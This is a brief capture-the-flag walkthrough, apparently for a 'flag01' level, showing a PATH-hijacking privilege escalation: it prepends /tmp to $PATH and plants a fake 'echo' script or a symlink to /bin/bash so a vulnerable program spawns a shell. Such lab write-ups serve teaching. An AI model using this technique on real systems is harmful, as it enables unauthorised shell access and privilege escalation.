 - Seems something to do with `$PATH`
 - Set the `tmp` in the `$PATH` variable using the command below:
 
        export PATH=/tmp:$PATH
 
 - Create a executable bash file inside tmp folder and name it echo.
 
          #! /bin/bash
          bash
 
 - When the flag01 is executed /tmp/echo will get executed.
 
 - We can also create a symlink in tmp folder to execute whatever file we wnat to execute.
    `ln -s /bin/bash /tmp/echo`
    
  
    
    
